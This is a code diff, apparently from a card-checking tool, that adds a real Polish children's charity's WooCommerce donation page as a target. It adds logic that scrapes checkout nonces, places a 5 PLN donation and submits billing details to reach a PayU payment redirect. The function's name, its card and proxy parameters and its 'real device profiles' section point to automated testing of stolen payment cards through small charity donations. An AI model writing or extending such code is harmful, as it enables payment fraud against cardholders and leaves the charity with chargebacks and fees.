@@ -299,6 +299,21 @@ PAYU_SITES = {
             "locale": "pl",
         },
     },
+    "nadziejadladzieci": {
+        "create_type": "woocommerce",
+        "page_url": "https://www.nadziejadladzieci.pl/darowizna/",
+        "admin_ajax_url": "https://www.nadziejadladzieci.pl/wp-admin/admin-ajax.php",
+        "checkout_url": "https://www.nadziejadladzieci.pl/?wc-ajax=checkout",
+        "referer": "https://www.nadziejadladzieci.pl/darowizna/",
+        "origin": "https://www.nadziejadladzieci.pl",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -483,6 +498,50 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
             if r2.status_code != 200:
                 raise Exception(f"orders/pay failed: HTTP {r2.status_code} {r2.text[:150]}")
             redirect = (r2.json().get("data") or "") if r2.headers.get("Content-Type", "").startswith("application/json") else ""
+        elif cfg["create_type"] == "woocommerce":
+            # step 1: GET the page -> extract nonces + postid + form_id
+            r = await s.get(cfg["page_url"], headers={"Referer": cfg["referer"]})
+            html = r.text
+            cn = re.search(r'woocommerce-process-checkout-nonce[^>]*value="([^"]+)"', html)
+            sec = re.search(r'name="security"\s+value="([^"]+)"', html)
+            pid = re.search(r'name="postid" value="([^"]+)"', html)
+            fid = re.search(r'name="wcdp_form_id" value="([^"]+)"', html)
+            if not (cn and sec and pid and fid):
+                raise Exception("woocommerce: missing nonces/postid")
+            # step 2: donation calculation -> adds the product to the cart
+            ajax = {
+                "action": "wcdp_ajax_donation_calculation",
+                "security": sec.group(1),
+                "postid": pid.group(1),
+                "wcdp_form_id": fid.group(1),
+                "donation-amount": "other",
+                "wcdp-donation-amount": cfg["amount"],
+                "quantity": "1",
+            }
+            r = await s.post(cfg["admin_ajax_url"], data=ajax,
+                             headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                                      "Content-Type": "application/x-www-form-urlencoded",
+                                      "X-Requested-With": "XMLHttpRequest"})
+            # step 3: checkout -> PayU redirect
+            checkout = {
+                "billing_first_name": first,
+                "billing_last_name": last,
+                "billing_company": "",
+                "billing_email": email,
+                "order_comments": "",
+                "lang": "pl",
+                "payment_method": "payustandard",
+                "terms": "on",
+                "terms-field": "1",
+                "woocommerce-process-checkout-nonce": cn.group(1),
+                "_wp_http_referer": "/?wc-ajax=update_order_review",
+            }
+            r2 = await s.post(cfg["checkout_url"], data=checkout,
+                              headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                                       "Content-Type": "application/x-www-form-urlencoded",
+                                       "X-Requested-With": "XMLHttpRequest"})
+            data = r2.json()
+            redirect = data.get("redirect") or ""
         elif cfg["create_type"] == "form_nonce":
             # GET the page -> extract the anti-CSRF nonce + session cookie
             page_url = cfg.get("page_url") or cfg["create_url"]
